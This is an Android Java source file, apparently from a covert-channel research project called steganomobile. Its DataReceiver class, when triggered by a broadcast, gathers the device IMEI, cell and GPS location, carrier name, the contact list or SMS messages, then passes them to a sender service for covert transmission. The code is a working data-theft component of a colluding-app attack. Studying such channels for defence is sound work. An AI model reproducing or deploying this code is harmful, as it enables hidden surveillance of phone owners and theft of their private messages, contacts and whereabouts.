package com.steganomobile.sender.controller;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.steganomobile.common.Const;
import com.steganomobile.common.sender.model.CcSenderItem;
import com.steganomobile.common.sender.model.CcType;
import com.steganomobile.sender.view.DataService;

import static com.steganomobile.common.Const.ACTION_START_SENDER_CC;
import static com.steganomobile.common.Const.EXTRA_ITEM_SENDER_CC;

public class DataReceiver extends BroadcastReceiver {

    private static final String TAG = DataReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {

        Log.e(TAG, intent.getAction());

        if (ACTION_START_SENDER_CC.equals(intent.getAction())) {
            CcSenderItem item = intent.getParcelableExtra(EXTRA_ITEM_SENDER_CC);
            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
            int port = Integer.parseInt(prefs.getString(Const.PREF_KEY_PORT, Const.DEFAULT_PORT));
            item.getInfo().setPort(port);
            setPhoneStateMessage(context, item);
            Intent newIntent = new Intent(context, DataService.class);
            newIntent.putExtra(EXTRA_ITEM_SENDER_CC, item);
            context.startService(newIntent);
        }
    }

    private void setPhoneStateMessage(Context context, CcSenderItem item) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (item.getInfo().getType() == CcType.IMEI) {
            String data = telephonyManager.getDeviceId();
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);

        } else if (item.getInfo().getType() == CcType.CELL_LOCATION) {
            String data = telephonyManager.getCellLocation().toString();
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);

        } else if (item.getInfo().getType() == CcType.OPERATOR_NAME) {
            String data = telephonyManager.getNetworkOperatorName();
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);

        } else if (item.getInfo().getType() == CcType.LOCATION) {
            String data = PrivateDataGetter.getLocation(context);
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);

        } else if (item.getInfo().getType() == CcType.CONTACTS) {
            String data = PrivateDataGetter.getContactsList(context);
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);

        } else if (item.getInfo().getType() == CcType.SMS) {
            String data = PrivateDataGetter.getSms(context);
            if (data == null) data = PrivateDataGetter.NOT_SPECIFIED;
            item.setData(data);
        }
    }
}
